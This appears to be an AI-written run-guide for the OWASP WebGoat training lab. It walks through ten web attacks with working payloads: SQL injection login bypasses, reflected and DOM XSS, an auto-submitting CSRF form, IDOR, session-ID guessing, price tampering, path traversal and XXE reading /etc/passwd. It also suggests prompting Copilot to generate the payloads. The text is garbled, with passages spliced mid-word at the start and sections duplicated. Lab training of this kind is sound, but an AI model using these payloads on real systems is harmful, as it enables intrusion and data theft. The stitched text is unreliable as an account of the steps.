## 0) Ch**Note:** This instance### 1) SQL Injection → *Injection Flaws → SQL Injection*

**Prompt in VS Code:**
`// In WebGoat v8, suggest a single-string SQL injection to bypass login`

**Common Payloads to Try:**
- `admin'--` (comments out password check)
- `' OR '1'='1` (always true condition)
- `' OR 1=1--` (combination approach)

**Run:** Open the **SQL Injection** lesson. Paste one of the payloads into the vulnerable **username / id** field, put anything in the other field, **Submit**. (You should see unauthorized data/bypass if the input is right.)unning via Maven, not Docker. Both applications are accessible and ready for testing.

**Quick Start:**
1. Open WebGoat at the URL above
2. Navigate through the lesson menu on the left
3. Each section below corresponds to different lesson categories
4. Use the prompts to generate payloads with Copilot
5. Test the payloads in the appropriate lessons

**Tip:** In VS Code, paste each line below as a comment (or plain text) to get Copilot's suggestion, **copy the suggested payload**, and paste it into the WebGoat lesson's input.

---

## DETAILED STEP-BY-STEP INSTRUCTIONS

### 🎯 1) SQL Injection Attack

**Navigate:**
1. Go to http://127.0.0.1:8080/WebGoat
2. Left sidebar → **(A1) Injection** → **SQL Injection (intro)**

**Execute:**
1. Find the login form with Username/Password fields
2. Enter: 
   - Username: `admin'--`
   - Password: `anything`
3. Click **Submit**
4. ✅ Success: You bypass login and see admin content

**Alternative payloads to try:**
- `' OR '1'='1`
- `' OR 1=1--`
- `admin' OR '1'='1'--`

---

### 🎯 2) Reflected XSS Attack

**Navigate:**
1. Left sidebar → **(A7) Cross-Site Scripting (XSS)** → **Cross-Site Scripting**

**Execute:**
1. Find input field (search box, message field, etc.)
2. Enter: `<script>alert('XSS')</script>`
3. Click **Submit**
4. ✅ Success: Alert popup appears saying "XSS"

**Alternative payloads:**
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`

---

### 🎯 3) CSRF Attack

**Navigate:**
1. Left sidebar → **(A8) Cross-Site Request Forgery (CSRF)**

**Setup WebWolf:**
1. Open http://127.0.0.1:9090/WebWolf
2. Login: adminrpza/adminrpza
3. Go to **Files** section

**Execute:**
1. Create file `csrf_attack.html` in WebWolf
2. Content:
```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" method="POST">
    <input type="hidden" name="csrf" value="true"/>
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```
3. Save and open the file in WebWolf
4. ✅ Success: Auto-submits to WebGoat, completes lesson

---

### 🎯 4) IDOR (Access Other User's Data)

**Navigate:**
1. Left sidebar → **(A5) Broken Access Control** → **Insecure Direct Object References**

**Execute:**
1. Click "View Profile" or similar action
2. Note URL: `...?id=123` or `...?user=tom`
3. **Method A - URL Change:**
   - Change URL to `?id=124`, `?id=125`
   - Press Enter
4. **Method B - DevTools:**
   - Press F12 → Network tab
   - Repeat action → Right-click request → Edit and Resend
   - Change ID parameter → Send
5. ✅ Success: See another user's data

---

### 🎯 5) Session Hijacking

**Navigate:**
1. Left sidebar → **(A2) Broken Authentication** → **Session Management**

**Execute:**
1. Login/logout multiple times, note session IDs
2. Look for pattern: `ABC123`, `ABC124`, `ABC125`
3. Predict next IDs: `ABC126`, `ABC127`
4. **Test with DevTools:**
   - F12 → Application → Cookies
   - Change JSESSIONID to predicted value
   - Refresh page
5. ✅ Success: Access another user's session

---

### 🎯 6) Parameter Tampering (Hidden Fields)

**Navigate:**
1. Left sidebar → **Client Side** → **Bypass Client Side Controls**

**Execute:**
1. Find shopping cart or price form
2. Right-click → Inspect Element
3. Find: `<input type="hidden" name="price" value="100">`
4. Double-click value, change to `value="1"`
5. Submit form
6. ✅ Success: Purchase at tampered price

---

### 🎯 7) Path Traversal

**Navigate:**
1. Left sidebar → **(A5) Broken Access Control** → **Path Traversal**

**Execute:**
1. Find file view/download input
2. Enter: `../../../etc/passwd`
3. **Alternative attempts:**
   - `../../../../windows/system32/drivers/etc/hosts`
   - `%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
4. Click Submit/View
5. ✅ Success: System files displayed

---

### 🎯 8) Log Injection

**Navigate:**
1. Left sidebar → **(A9) Security Logging** → **Log Spoofing**

**Execute:**
1. Find username input field
2. Enter:
```
admin
admin: Authentication succeeded for user: hacker
```
3. Submit
4. Click "Show Logs"
5. ✅ Success: Fake log entry appears

---

### 🎯 9) XXE (XML External Entity)

**Navigate:**
1. Left sidebar → **(A4) XML External Entities (XXE)**

**Execute:**
1. Find XML input textarea
2. Enter:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
3. Submit/Parse
4. ✅ Success: File contents displayed in response

---

### 🎯 10) DOM XSS

**Navigate:**
1. Left sidebar → **(A7) Cross-Site Scripting (XSS)** → **DOM-Based XSS**

**Execute:**
1. **Method A - URL Fragment:**
   - Add to URL: `#<script>alert('DOM XSS')</script>`
   - Press Enter
2. **Method B - Form Input:**
   - Find input processed by JavaScript
   - Enter: `<img src=x onerror=alert('DOM XSS')>`
3. ✅ Success: Alert fires without server round-trip

---

## 📋 PROGRESS TRACKER

**Check off each attack as you complete it:**

- [ ] 🎯 **SQL Injection** - Successfully bypassed login with `admin'--`
- [ ] 🎯 **Reflected XSS** - Alert popup fired with `<script>alert('XSS')</script>`
- [ ] 🎯 **CSRF** - Auto-submitted form via WebWolf
- [ ] 🎯 **IDOR** - Accessed another user's data by changing ID parameter
- [ ] 🎯 **Session Hijacking** - Predicted and used another user's session ID
- [ ] 🎯 **Parameter Tampering** - Modified hidden price field successfully
- [ ] 🎯 **Path Traversal** - Read system files with `../../../etc/passwd`
- [ ] 🎯 **Log Injection** - Forged fake log entries with newline injection
- [ ] 🎯 **XXE** - Extracted files using XML external entities
- [ ] 🎯 **DOM XSS** - Executed JavaScript via DOM manipulation

**🏆 COMPLETION STATUS: ___/10**

---

## 🛠️ TROUBLESHOOTING TIPS

**If an attack doesn't work:**
1. **Check the lesson requirements** - Some need specific setup
2. **Try different payloads** - Multiple variations provided
3. **Look for hints** - WebGoat provides hints for each lesson
4. **Check DevTools Console** - Look for JavaScript errors
5. **Verify you're in the right lesson** - Navigation paths provided above

**Common Issues:**
- **XSS blocked?** Try different HTML tags or encoding
- **SQL injection fails?** Check if quotes are escaped differently
- **CSRF not working?** Verify form action URL and parameter names
- **Path traversal blocked?** Try URL encoding or different traversal depths

---

---endpoints

* **WebGoat UI:** `http://127.0.0.1:8080/WebGoat`
  (If you haven't yet, click **Register** to create a user, then sign in.) 
  - **Current Status**: ✅ Running (Maven spring-boot:run)
  - **Your Account**: adminrpza / adminrpza
* **WebWolf (for hosting CSRF/phish pages):** `http://127.0.0.1:9090/WebWolf` (log in with the same account).

**Note:** This instance is running via Maven, not Docker. Both applications are accessible and ready for testing.) Check your endpoints (Docker defaults)

* **WebGoat UI:** `http://127.0.0.1:8080/WebGoat`
  (If you haven’t yet, click **Register** to create a user, then sign in.) ([Docker Hub][1], [ACTE Technologies][2])
* **WebWolf (for hosting CSRF/phish pages):** `http://127.0.0.1:9090/WebWolf` (log in with the same account). ([Docker Hub][1], [Medium][3])

**Tip:** In VS Code, paste each line below as a comment (or plain text) to get Copilot’s suggestion, **copy the suggested payload**, and paste it into the WebGoat lesson’s input.

---

## Run guide (one per category)

### 1) SQL Injection → *Injection Flaws → SQL Injection*

**Prompt in VS Code:**
`// In WebGoat v8, suggest a single-string SQL injection to bypass login`
**Run:** Open the **SQL Injection** lesson. Paste Copilot’s string into the vulnerable **username / id** field, put anything in the other field, **Submit**. (You should see unauthorized data/bypass if the input is right.)

### 2) Reflected XSS → *XSS → Reflected XSS*

**Prompt:**
`<!-- In WebGoat, propose a minimal reflected XSS input that pops an alert -->`
**Run:** Open **Reflected XSS**. Paste Copilot’s snippet into the **search/message** field, **Submit** → browser alert should fire.

### 3) CSRF (auto-POST) → *Cross-Site Request Forgery (basic/advanced)*

**Prompt:**
`<!-- In WebGoat, generate a minimal auto-submitting CSRF POST form with placeholder fields -->`
**Run (two easy ways):**

* **With WebWolf:** In **WebWolf** create `attack.html`, paste Copilot’s form, save, open it in WebWolf → it auto-submits to WebGoat and completes the step. ([Medium][3])
* **Local file:** Save `attack.html` on your machine and open it in a browser (works for many labs).
  *(Fill action/field names to match the lesson page.)*

### 4) Broken Access Control / IDOR → *Access Control → Insecure Direct Object Reference*

**Prompt:**
`// In WebGoat, suggest a simple URL/query parameter tamper (employee_id) to view another user`
**Run:** In the IDOR lesson, perform the action once, open **DevTools → Network → Right-click → Edit and Resend** (or copy as cURL), change the `employee_id` (or similar) to a different value, **Resend**. You should see another user’s data.

### 5) Session Management (predictable IDs) → *Session Management → Hijacking/Predictable*

**Prompt:**
`// In WebGoat, outline a quick script to guess sequential session IDs`
**Run:** Follow the lesson to gather a few issued IDs, then use Copilot’s tiny script idea (or just try adjacent values in the lab’s input) to submit **nearby IDs** until the lesson confirms a match.

### 6) Parameter Tampering → *Client-Side Validation / Hidden Fields*

**Prompt:**
`// In WebGoat, example of changing a hidden 'price' field before submit`
**Run:** In the **shopping/hidden field** lesson, start checkout, intercept the request (DevTools or proxy), **edit the hidden `price`** to a tiny value, **Resend** → lesson should validate the tamper was accepted.

### 7) Path Traversal → *Access Control → Path-based / Directory Traversal*

**Prompt:**
`// In WebGoat, propose a filename/path traversal string to escape a folder and read a config file`
**Run:** In the traversal lesson’s **file path** box, paste Copilot’s `../` pattern, **View/Submit** to fetch a restricted file (the lab will confirm). ([Medium][4])

### 8) Log Injection → *General → Log Spoofing*

**Prompt:**
`// In WebGoat, suggest a username value that injects a newline to forge an extra log entry`
**Run:** In the **Log Spoofing** lesson, paste Copilot’s input in the **username** field, **Submit** → click the lesson’s **Show logs** to see the forged line.

### 9) XXE → *Injection Flaws → XML External Entity*

**Prompt:**
`<!-- For WebGoat lab, craft a test XML with a harmless external entity to fetch /etc/passwd -->`
**Run:** In the XXE lesson’s **XML textarea**, paste Copilot’s XML, **Submit** → the response should include the entity expansion (the lab detects success).

### 10) DOM XSS → *XSS → DOM-based*

**Prompt:**
`// In WebGoat, propose a URL hash/fragment payload that triggers DOM-based alert without server changes`
**Run:** Open the **DOM XSS** page, append Copilot’s fragment to the page URL (after `#`), **Enter** → alert fires if the page sinks the fragment unsafely.

---

## Progress Tracking

Use this checklist to track your completion:

- [ ] 1) SQL Injection - Login bypass
- [ ] 2) Reflected XSS - Alert popup
- [ ] 3) CSRF - Auto-POST form
- [ ] 4) IDOR - Access other user data
- [ ] 5) Session Management - ID prediction
- [ ] 6) Parameter Tampering - Hidden field modification
- [ ] 7) Path Traversal - File system access
- [ ] 8) Log Injection - Log spoofing
- [ ] 9) XXE - External entity processing
- [ ] 10) DOM XSS - Client-side execution

---

### Optional tooling tips

* **Burp/ZAP** make “Edit and resend” and CSRF testing faster (not required but handy). The official Docker run maps both ports for **WebGoat (8080)** and **WebWolf (9090)** out of the box. ([Docker Hub][1])

> All of this stays inside your lab; do **not** aim these at real sites. WebGoat exists precisely for this purpose. ([OWASP Foundation][5])

If you want, I can turn this into a **one-page run sheet** (printable) with checkboxes for your live demo.

[1]: https://hub.docker.com/r/webgoat/webgoat?utm_source=chatgpt.com "Docker Image - webgoat"
[2]: https://www.acte.in/webgoat-tutorial?utm_source=chatgpt.com "WebGoat: A Complete Guide Tutorial | CHECK-OUT"
[3]: https://medium.com/%40develouise/getting-started-with-webgoat-and-webwolf-using-jar-d06431883cc2?utm_source=chatgpt.com "Getting Started with WebGoat and WebWolf using JAR."
[4]: https://pvxs.medium.com/webgoat-path-traversal-2-3-4-561ba00b020e?utm_source=chatgpt.com "WebGoat Path Traversal 2 3 4 - PVXs - Medium"
[5]: https://owasp.org/www-project-webgoat/?utm_source=chatgpt.com "OWASP WebGoat"
